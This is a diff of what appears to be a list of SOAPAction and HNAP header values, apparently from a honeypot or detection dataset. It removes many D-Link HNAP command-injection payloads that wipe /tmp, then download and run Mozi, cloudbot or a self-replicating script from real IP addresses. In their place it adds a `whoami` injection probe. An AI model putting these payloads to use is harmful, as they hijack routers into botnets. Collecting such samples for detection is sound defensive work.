@@ -1,21 +1,4 @@
-
-"http://purenetworks.com/HNAP1/GetDeviceSettings/`cd && cd tmp && export PATH=$PATH:. && cd /tmp;wget http://37.0.11.220/a/wget.sh;chmod 777 wget.sh;sh wget.sh selfrep.dlink;rm -rf wget.sh`"
-"urn:Belkin:service:basicevent:1#GetBinaryState"
-http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://103.225.127.107:45552/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`
-http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://107.174.35.243/bins/mips.cloudbot && chmod +x mips.cloudbot;./mips.cloudbot`
-http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://112.228.75.113:58956/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`
-http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://115.55.53.16:35519/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`
-http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://119.180.35.231:48211/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`
-http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://163.179.170.6:41663/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`
-http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://178.175.101.70:45737/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`
-http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://178.175.127.241:53199/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`
-http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://178.175.22.93:53032/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`
-http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://178.175.51.1:43747/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`
-http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://178.175.93.111:53485/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`
-http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://192.168.1.1:8088/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`
-http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://27.215.177.169:49603/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`
-http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://39.83.208.61:34521/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`
-http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://42.224.105.135:42398/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`
-http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://58.248.147.59:56023/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`
+http://purenetworks.com/HNAP1/`whoami`
+urn:Belkin:service:basicevent:1#GetBinaryState
 urn:dslforum-org:service:Time:1#SetNTPServers
 urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
